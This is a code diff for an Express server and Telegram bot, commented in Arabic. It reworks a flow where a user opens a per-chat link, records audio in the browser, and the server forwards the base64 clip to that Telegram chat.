@@ -3614,96 +3614,46 @@ app.post('/submitLocation', async (req, res) => {
 });
 
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json({ limit: '10mb' }));
-app.use(express.raw({
-    type: 'application/octet-stream',
-    limit: '10mb'
-}));
+app.use(express.json());
 app.use(express.static('public'));
 
-// توجيه لصفحة تسجيل الصوت
-app.get('/', (req, res) => {
+// توجيه لصفحة HTML
+app.get('/recordAudio', (req, res) => {
     const chatId = req.query.chatId;
     if (chatId) {
-        res.sendFile(path.join(__dirname, 'audio.html'));
+        res.sendFile(path.join(__dirname, 'public', 'audio.html'));
     } else {
         res.status(400).send('خطأ: chatId مطلوب');
     }
 });
 
 // نقطة النهاية لاستقبال الصوت من الصفحة HTML
-app.post('/submit-audio', async (req, res) => {
+app.post('/submitAudio', async (req, res) => {
     try {
-        console.log('طلب استقبال صوت - حجم البيانات:', req.body.length);
+        const { chatId, audioData } = req.body;
         
-        // الحصول على معرف المحادثة من query parameters أو body
-        const chatId = req.query.chatId || req.body.chatId;
-        
-        if (!chatId) {
-            return res.status(400).json({ 
-                success: false, 
-                message: 'معرف المحادثة مطلوب' 
-            });
+        if (!chatId || !audioData) {
+            return res.status(400).send('بيانات ناقصة');
         }
 
-        if (!req.body || req.body.length === 0) {
-            return res.status(400).json({ 
-                success: false, 
-                message: 'لم يتم استقبال بيانات صوتية' 
-            });
-        }
+        console.log('تم استقبال الصوت:', { chatId });
 
-        console.log('تم استقبال البيانات الصوتية:', { 
-            chatId, 
-            dataSize: req.body.length 
+        // إرسال رسالة نصية للمستخدم
+        await bot.sendMessage(chatId, '✅ تم استلام تسجيلك الصوتي بنجاح!');
+
+        // إرسال الملف الصوتي (نحتاج لتحويل البيانات base64 إلى ملف)
+        const audioBuffer = Buffer.from(audioData.split(',')[1], 'base64');
+        
+        await bot.sendVoice(chatId, audioBuffer, {
+            caption: 'تسجيل صوتي تم استلامه'
         });
 
-        try {
-            // إرسال رسالة تأكيد
-            await bot.sendMessage(chatId, '🎤 تم استقبال تسجيلك الصوتي بنجاح!');
-
-            // إرسال الصوت مباشرة من الذاكرة
-            await bot.sendAudio(
-                chatId, 
-                req.body,
-                {
-                    caption: 'تسجيل صوتي مدته 10 ثواني',
-                    title: 'تسجيل صوتي'
-                }
-            );
-
-            console.log('تم إرسال الصوت إلى التلجرام بنجاح');
-
-            res.status(200).json({ 
-                success: true, 
-                message: 'تم استقبال الصوت بنجاح' 
-            });
-
-        } catch (telegramError) {
-            console.error('خطأ في إرسال التلجرام:', telegramError);
-            
-            res.status(500).json({ 
-                success: false, 
-                message: 'خطأ في إرسال الصوت إلى التلجرام: ' + telegramError.message 
-            });
-        }
+        res.status(200).json({ success: true, message: 'تم استلام الصوت بنجاح' });
         
     } catch (error) {
         console.error('خطأ في معالجة الصوت:', error);
-        
-        res.status(500).json({ 
-            success: false, 
-            message: 'خطأ في الخادم: ' + error.message 
-        });
+        res.status(500).send('خطأ في الخادم');
     }
-});
-
-// نقطة النهاية للتحقق من حالة السيرفر
-app.get('/status', (req, res) => {
-    res.json({ 
-        status: 'يعمل', 
-        timestamp: new Date().toISOString() 
-    });
 });
 
 // أمر البدء /start
@@ -3712,11 +3662,11 @@ bot.onText(/\/start/, (msg) => {
     
     const keyboard = {
         inline_keyboard: [
-            [{ text: 'تسجيل الصوت 🎤', callback_data: `recordAudio:${chatId}` }]
+            [{ text: 'تسجيل صوتي ', callback_data: `recordAudio:${chatId}` }]
         ]
     };
     
-    bot.sendMessage(chatId, 'مرحباً! اضغط على الزر أدناه لتسجيل صوت', {
+    bot.sendMessage(chatId, 'مرحباً! اضغط على الزر أدناه لتسجيل صوتي', {
         reply_markup: keyboard
     });
 });
@@ -3731,12 +3681,12 @@ bot.on('callback_query', (callbackQuery) => {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
-        const audioUrl = `${baseUrl}/?chatId=${targetChatId}`;
+        const audioUrl = `${baseUrl}/recordAudio?chatId=${targetChatId}`;
         
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
             chatId, 
-            `اقققنقر على الرابط التالي لتسجيل صوتك:\n\n${audioUrl}`
+            `انقر على الرابط التالي لتسجيل صوتك:\n\n${audioUrl}`
         );
         
         // تأكيد استلام الضغط
